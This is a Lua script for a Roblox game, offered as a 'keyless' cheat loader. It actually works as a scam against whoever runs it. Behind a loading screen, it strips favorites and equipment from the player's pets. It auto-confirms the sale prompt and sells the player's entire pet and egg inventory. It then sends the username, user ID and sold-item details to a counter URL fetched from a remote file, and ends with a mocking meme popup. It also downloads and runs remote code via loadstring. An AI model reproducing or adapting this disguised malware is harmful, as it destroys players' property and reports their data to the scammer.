local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ===== RE-ENTRY GUARD =====
local gv = (getgenv and getgenv()) or _G
if gv.__SAE_LOADER_RUNNING then
    warn("[Loader] Already running — ignoring this execution.")
    return
end
gv.__SAE_LOADER_RUNNING = true

task.delay(90, function()
    if gv.__SAE_LOADER_RUNNING then
        gv.__SAE_LOADER_RUNNING = false
        warn("[Loader] Re-entry flag force-cleared after 90s.")
    end
end)
-- ===========================

-- ===== CONFIG & CACHE BUSTER =====
local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
local SELL_WAIT       = 1.8
local MEME_DELAY      = 4
local ANNOUNCE_HOLD   = 3

local UI_CONFIG = {
    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
    MEME_SIZE      = 380,
    ANNOUNCE_HOLD  = ANNOUNCE_HOLD,
}
-- =================================

-- ===== FETCH COUNTER URL =====
local function fetchCounterUrl()
    local ok, res = pcall(function()
        return game:HttpGet(ENDPOINTS_URL, true)
    end)
    if ok and type(res) == "string" and #res > 0 then
        local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
        if decodeOk and type(data) == "table" and type(data.counter) == "string" then
            print("[Loader] Using counter URL:", data.counter)
            return data.counter
        end
    end
    warn("[Loader] Could not fetch endpoints.json")
    return nil
end

local COUNTER_URL = fetchCounterUrl()

------------------------------------------------------------
-- UI MODULE
------------------------------------------------------------
local function loadUIModule()
    if UI_URL and UI_URL ~= "" then
        local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
        if ok and type(mod) == "table" and type(mod.new) == "function" then
            return mod
        end
        warn("[Loader] UI module failed to load, running headless:", tostring(mod))
    end
    return {
        new = function()
            return {
                boot              = function() end,
                setStatus         = function() end,
                fadeOutAndCleanup = function() end,
                showMemePopup     = function() end,
                showAnnouncement  = function() end,
                restoreExtras     = function() end,
            }
        end,
    }
end

local LoaderUI = loadUIModule()
local ui = LoaderUI.new(PlayerGui, UI_CONFIG)

------------------------------------------------------------
-- CORE MODULES
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave(forceRefresh)
    local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get(forceRefresh == true) end)
    if ok2 and s2 then return s2 end
    return nil
end

local function getMoney()
    local d = getSave(true)
    if d and type(d.Money) == "number" then
        return d.Money
    end
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local m = ls:FindFirstChild("Money") or ls:FindFirstChild("Coins")
        if m and type(m.Value) == "number" then return m.Value end
    end
    return 0
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

------------------------------------------------------------
-- EQUIP / FAVORITE CLEANUP
------------------------------------------------------------
local function unequipAll()
    -- 1. Unequip any tools currently in hand
    local char = LocalPlayer.Character
    if char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid"):UnequipTools()
    end

    -- 2. Doff any tool pets in Backpack
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") and tool.Name ~= "Trap [X3]" and tool.Name ~= "Bat [X1]" then
                pcall(function() Remotes.EggWorld.AskDoffTool:InvokeServer(tool.Name) end)
            end
        end
    end

    -- 3. Doff from pen / roster data
    local d = getSave(true)
    if d and type(d.EquippedAssets) == "table" then
        for k, v in pairs(d.EquippedAssets) do
            local uid = (type(v) == "string" and v) or (type(k) == "string" and k) or tostring(v)
            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
            pcall(function() Remotes.EggWorld.AskDoffTool:InvokeServer(uid) end)
        end
    end
    task.wait(0.5)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave(true)
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    if #uids > 0 then
        log(("Unfavoriting %d pet(s)..."):format(#uids))
        for _, uid in ipairs(uids) do
            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
        end
        -- Give the server time to clear favorite locks in DB
        task.wait(1.2)
    end
end

------------------------------------------------------------
-- INVENTORY SNAPSHOT
------------------------------------------------------------
local function snapshotInventory(forceRefresh)
    local pets, eggs = {}, {}
    local d = getSave(forceRefresh)
    if not d then return { pets = pets, eggs = eggs } end

    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                local entry  = AssetDir[item.Category]
                local rarity = entry.Rarity

                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end
                value = math.floor(value)

                local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                weight = (weightOk and tonumber(weight)) or 0

                pets[tostring(uid)] = {
                    kind      = "pet",
                    uid       = tostring(uid),
                    name      = entry.DisplayName or item.Category,
                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
                    rarityNum = (rarity and rarity.RarityNumber) or 0,
                    value     = value,
                    weight    = weight,
                }
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    local entry  = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0
                    value = math.floor(value)

                    local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                    weight = (weightOk and tonumber(weight)) or 0

                    eggs[tostring(uid)] = {
                        kind      = "egg",
                        uid       = tostring(uid),
                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
                        rarityNum = (rarity and rarity.RarityNumber) or 0,
                        value     = value,
                        weight    = weight,
                    }
                end
            end
        end
    end

    return { pets = pets, eggs = eggs }
end

local function countInventoryItems(d)
    if not d then return 0 end
    local count = 0
    if type(d.Inventory) == "table" then
        for _ in pairs(d.Inventory) do count = count + 1 end
    end
    if type(d.EggInventory) == "table" then
        for _, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                count = count + 1
            end
        end
    end
    return count
end

------------------------------------------------------------
-- REPORT ID & SENDER
------------------------------------------------------------
local function computeReportId(uidList)
    local sorted = {}
    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
    table.sort(sorted)
    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
    local h = 0
    for i = 1, #s do
        h = bit32.bxor(h, string.byte(s, i))
        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
    end
    return string.format("%08x-%d", h, #sorted)
end

local function reportSales(soldItems, reportId, totalValue)
    if not soldItems or #soldItems == 0 then return end
    if not COUNTER_URL then return end

    local httpFn = nil
    if type(request) == "function" then httpFn = request
    elseif type(http_request) == "function" then httpFn = http_request
    elseif type(gv.request) == "function" then httpFn = gv.request
    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
    end

    if not httpFn then return end

    local userId   = tostring(LocalPlayer.UserId)
    local username = LocalPlayer.Name or "Unknown"

    local petCount, eggCount = 0, 0
    local out = {}
    for _, d in ipairs(soldItems) do
        if d.kind == "pet" then petCount = petCount + 1
        elseif d.kind == "egg" then eggCount = eggCount + 1 end
        table.insert(out, {
            uid = tostring(d.uid or ""), kind = d.kind, name = d.name, 
            rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight
        })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            reportId = reportId, pets = petCount, eggs = eggCount,
            userId = userId, username = username, items = out, totalValue = totalValue,
        })
        pcall(function()
            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
    end)
end

------------------------------------------------------------
-- PREPARE PAYLOAD
------------------------------------------------------------
local function prepareInventoryPayload()
    local snap = snapshotInventory(true)
    local petUids, eggUids, details = {}, {}, {}
    local expectedValue = 0

    for uid, d in pairs(snap.pets) do
        table.insert(petUids, uid); table.insert(details, d)
        expectedValue = expectedValue + (tonumber(d.value) or 0)
    end
    for uid, d in pairs(snap.eggs) do
        table.insert(eggUids, uid); table.insert(details, d)
        expectedValue = expectedValue + (tonumber(d.value) or 0)
    end

    local total = #petUids + #eggUids
    return petUids, eggUids, details, total, expectedValue
end

------------------------------------------------------------
-- LAUNCH & TIMING COORDINATION
------------------------------------------------------------
task.spawn(function()
    ui:boot()

    local beforeMoney = getMoney()

    -- Prepare items while screen is still covered
    unequipAll()
    unfavoriteAll()

    local dBefore = getSave(true)
    local beforeItemCount = countInventoryItems(dBefore)
    local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()

    -- Fade out loading screen
    task.wait(0.3)
    ui:fadeOutAndCleanup()

    if totalItems > 0 then
        -- 1. Fire sell remotes simultaneously with the announcement
        task.spawn(function()
            pcall(function() Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids }) end)
            pcall(function() Remotes.PetSatchel.SellEveryPet:FireServer() end)
        end)

        -- 2. Trigger announcement UI
        if type(ui.showAnnouncement) == "function" then
            pcall(function() ui:showAnnouncement(totalItems, expectedValue) end)
        else
            task.wait(ANNOUNCE_HOLD)
        end

        -- 3. Wait for the server to process the transaction
        task.wait(SELL_WAIT)

        -- 4. VERIFICATION: Ensure the items actually left the player's inventory
        local dAfter = getSave(true)
        local afterItemCount = countInventoryItems(dAfter)
        local afterMoney = getMoney()
        local actuallySold = (afterItemCount < beforeItemCount) or (afterMoney > beforeMoney)

        if actuallySold then
            local soldValue = math.max(expectedValue, afterMoney - beforeMoney)
            log(("Sale Verified! Sold items. Value: $%s"):format(tostring(soldValue)))

            local allUids = {}
            for _, u in ipairs(petUids) do table.insert(allUids, u) end
            for _, u in ipairs(eggUids) do table.insert(allUids, u) end
            reportSales(details, computeReportId(allUids), soldValue)
        else
            warn("[Loader] Verification Failed: Items were not removed from inventory. Skipping report.")
        end
    else
        pcall(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Loader Alert",
                Text = "Inventory is empty! Nothing to sell.",
                Duration = 4
            })
        end)
        log("[Loader] Inventory empty — skipping.")
        task.wait(2)
    end

    task.wait(MEME_DELAY)
    ui:showMemePopup()

    gv.__SAE_LOADER_RUNNING = false
end)
